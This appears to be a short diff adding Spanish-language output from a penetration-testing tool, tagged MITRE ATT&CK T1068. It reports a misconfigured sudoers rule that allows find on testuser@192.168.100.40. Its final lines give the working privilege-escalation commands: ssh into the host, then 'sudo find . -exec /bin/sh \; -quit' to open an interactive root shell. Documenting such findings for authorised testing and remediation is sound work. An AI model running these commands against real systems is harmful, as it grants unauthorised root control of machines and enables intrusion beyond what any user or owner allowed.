@@ -1,0 +1,6 @@
+[T1068] Explotación de sudoers mal configurado (find) en testuser@192.168.100.40
+Confirmando el permiso disponible:
+Explotando: find ejecuta un comando con privilegios de root
+Confirmado — para obtener una shell interactiva de root:
+  ssh testuser@192.168.100.40
+  sudo find . -exec /bin/sh \; -quit
